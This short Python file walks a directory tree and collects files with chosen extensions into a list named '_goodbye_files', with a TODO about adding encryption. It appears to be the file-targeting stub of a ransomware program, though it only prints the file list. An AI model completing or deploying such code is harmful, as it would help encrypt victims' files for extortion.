import os
import Utils

def findFiles(path):
    _goodbye_files = []
    for actual_path, directories, files_found in os.walk(path):
        for ff in files_found:
            ext = ff.split(".")[-1]
            if ext in Utils.file_extentions:
                _goodbye_files.append(os.path.join(actual_path,ff))
    return _goodbye_files

def main():
    """
    TODO Async -> File Explorer and Encryption
    """
    print(findFiles(Utils.root_directory))

if __name__ == "__main__":
    main()